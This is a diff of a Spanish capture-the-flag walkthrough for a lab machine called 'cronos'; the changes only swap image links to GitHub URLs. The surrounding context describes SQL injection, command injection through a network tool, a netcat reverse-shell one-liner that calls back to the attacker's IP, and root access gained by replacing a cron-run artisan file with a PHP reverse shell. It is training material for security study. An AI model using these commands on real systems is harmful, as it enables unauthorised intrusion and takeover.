@@ -68,38 +68,38 @@ nano /etc/hosts
 
 En la página encontramos que el login es vulnerable a SQLi
 
-![Imagen Login](Login.png)
+![Login.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/Login.png)
 
 Después de ese login entraremos a una herramienta web para la red con opción de traceroute y ping
 
-![Net_tool.png](Net_tool.png)
+![Net_tool.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/Net_tool.png)
 
 ### Segunda vulnerabilidad--RCE
 Descubrí que tiene una vulnerabilidad y se le puede inyectar código usando el ; ya que cumple como si fuese una terminal
-![Vulnerabilidad1.png](Vulnerabilidad1.png)
+![Vulnerabilidad1.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/Vulnerabilidad1.png)
 
 Aprovecharemos esto usando burpsuite para cambiar el comando y abrir una shell en nuestro equipo.
 
-![Burpsuite1.png](Burpsuite1.png)
+![Burpsuite1.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/Burpsuite1.png)
 
 Usamos el siguiente comando que nos permitirá hacer una escucha para obtener la reverse shell, recordar encodear los símbolos en URL
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.180 1234 >/tmp/f
 ```
 
-![Burpsuite2.png](Burpsuite2.png)
+![Burpsuite2.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/Burpsuite2.png)
 
 En mi caso he usado penelope para obtener la shell full interactiva, ya tenemos acceso y podremos acceder a la primera flag user.txt
 
-![Rev_Shell1.png](Rev_Shell1.png) 
+![Rev_Shell1.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/Rev_Shell1.png)
 
 
-![UserTXT.png](UserTXT.png)
+![UserTXT.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/UserTXT.png)
 
 Me crearé un servidor web para descargar en la máquina victima linpeas y proceder a enumerar.
 En la enumeración vemos algo muy interesante en los cronjobs y es que el fichero /var/www/laravel/artisan tenemos todos los permisos
 
-![EscaladaPrivs.png](EscaladaPrivs.png) 
+![EscaladaPrivs.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/EscaladaPrivs.png) 
 ```bash
 www-data@cronos:/tmp$ ls -la /var/www/laravel/artisan         
 -rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
@@ -108,8 +108,8 @@ www-data@cronos:/tmp$ ls -la /var/www/laravel/artisan
 ### Escalada de privilegios
 Para la escalada de privilegios cambiaremos el fichero php por una reverse shell que nos ejecutará el cron como root y tendremos acceso privilegiado al sistema.
 
-![EscaladaPrivs1.png](EscaladaPrivs1.png)
+![EscaladaPrivs1.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/EscaladaPrivs1.png)
 
 Ahora debemos poner en escucha a través del puerto que hemos puesto en la reverse shell y esperaremos, después de unos segundos seremos root y habremos completado la máquina.
 
-![RootTXT.png](RootTXT.png)
+![RootTXT.png](https://github.com/BIFITER/IM-GENES/blob/e67b27c0afa20f9815ebcf907aa1b7a9c606e512/RootTXT.png)
